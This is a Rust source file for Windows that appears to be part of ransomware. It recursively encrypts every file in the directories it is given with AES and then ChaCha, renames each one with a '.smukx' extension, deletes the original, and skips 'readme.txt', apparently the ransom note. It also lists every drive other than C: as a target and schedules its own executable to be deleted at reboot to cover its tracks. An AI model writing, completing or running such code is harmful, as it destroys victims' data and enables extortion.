use std::ffi::{OsStr, OsString};
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{FindFirstVolumeW, FindNextVolumeW, FindVolumeClose,GetVolumePathNamesForVolumeNameW};
use winapi::um::winbase::MoveFileExW;
use std::os::windows::ffi::{OsStrExt, OsStringExt};
use std::ptr::null_mut;
use crate::encrypt::{
    encrypt_aes, encrypt_chacha
};

// 

pub fn recursive_encrypt(dir: &Path, key: &[u8; 32], chacha_key: &[u8; 32], chacha_nonce: &[u8; 12]) {
    if dir.is_dir() {
        match fs::read_dir(dir) {
            Ok(entries) => {
                for entry in entries {
                    match entry {
                        Ok(entry) => {
                            let path = entry.path();
                            if path.is_dir() {
                                recursive_encrypt(&path, key, chacha_key, chacha_nonce);
                            } else {
                                encrypt_file(&path, key, chacha_key, chacha_nonce);
                            }
                        }
                        Err(e) => eprintln!("Failed to read entry: {}", e),
                    }
                }
            }
            Err(e) => eprintln!("Failed to read directory '{}': {}", dir.display(), e),
        }
    }
}

fn encrypt_file(file_path: &Path, key: &[u8; 32], chacha_key: &[u8; 32], chacha_nonce: &[u8; 12]) {
    if file_path.extension().and_then(|ext| ext.to_str()) == Some("smukx") {
        return;
    }

    if file_path.file_name().map_or(false, |name| name == "readme.txt"){
        return;
    }
    
    let mut contents = Vec::new();
    
    // Handle file open errors
    if let Ok(mut file) = File::open(file_path) {
        if let Err(e) = file.read_to_end(&mut contents) {
            eprintln!("Failed to read file '{}': {}", file_path.display(), e);
            return;
        }
    } else {
        eprintln!("File not found or unable to open: '{}'", file_path.display());
        return;
    }

    let encrypted_aes = encrypt_aes(&contents, key);
    let encrypted_chacha = encrypt_chacha(&encrypted_aes, chacha_key, chacha_nonce);

    let mut new_file_path = PathBuf::from(file_path);
    let new_ext = format!(
        "{}.smukx",
        file_path.extension().and_then(|ext| ext.to_str()).unwrap_or("")
    );
    new_file_path.set_extension(new_ext);

    if let Ok(mut enc_file) = File::create(&new_file_path) {
        if let Err(e) = enc_file.write_all(&encrypted_chacha) {
            eprintln!("Failed to write to file '{}': {}", new_file_path.display(), e);
            return;
        }
    } else {
        eprintln!("Unable to create file '{}'", new_file_path.display());
        return;
    }

    if let Err(e) = fs::remove_file(file_path) {
        eprintln!("Failed to delete the original file '{}': {}", file_path.display(), e);
    }
}


pub(crate) fn get_all_volumes() -> Vec<OsString>{

    let mut drive_letters = Vec::new();
    let mut volume_name: [u16; 260] = [0; 260];
    let mut path_name: [u16; 260] = [0; 260];

    unsafe{
        let volume_handle = FindFirstVolumeW(
            volume_name.as_mut_ptr(),
            260 as u32,
        );

        if volume_handle != null_mut(){
            loop{
                // let name_length = volume_name.iter().position(|&c| c == 0).unwrap_or(260);

                let result = GetVolumePathNamesForVolumeNameW(
                    volume_name.as_ptr(),
                    path_name.as_mut_ptr(),
                    260 as u32,
                    null_mut(),
                );

                if result != 0{
                    let mut start = 0;

                    while start < 260 {
                        let path_name_length = path_name[start..].iter().position(|&c| c == 0).unwrap_or(260);

                        if path_name_length == 0{
                            break;
                        }

                        let path_name = OsString::from_wide(&path_name[start..start + path_name_length]);

                        if !path_name.to_string_lossy().starts_with("C:\\") && !path_name.to_string_lossy().is_empty(){
                            drive_letters.push(path_name);
                        }

                        start += path_name_length + 1;

                    }
                }
                let find_next_volume = FindNextVolumeW(
                    volume_handle, 
                    volume_name.as_mut_ptr(),
                    260 as u32
                );

                if find_next_volume == 0{
                    if GetLastError() == 18{
                        break;
                    }
                }
            }
            FindVolumeClose(volume_handle);
        }
    }
    // At last return the drive letter 
    drive_letters

}

pub(crate) fn schedule_self_delete() {
    let exe_path = std::env::current_exe().unwrap();
    let exe_path_wide: Vec<u16> = OsStr::new(exe_path.to_str().unwrap())
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();

    unsafe {
        MoveFileExW(
            exe_path_wide.as_ptr(),
            null_mut(),
            0x00000004,
        );
    }
}
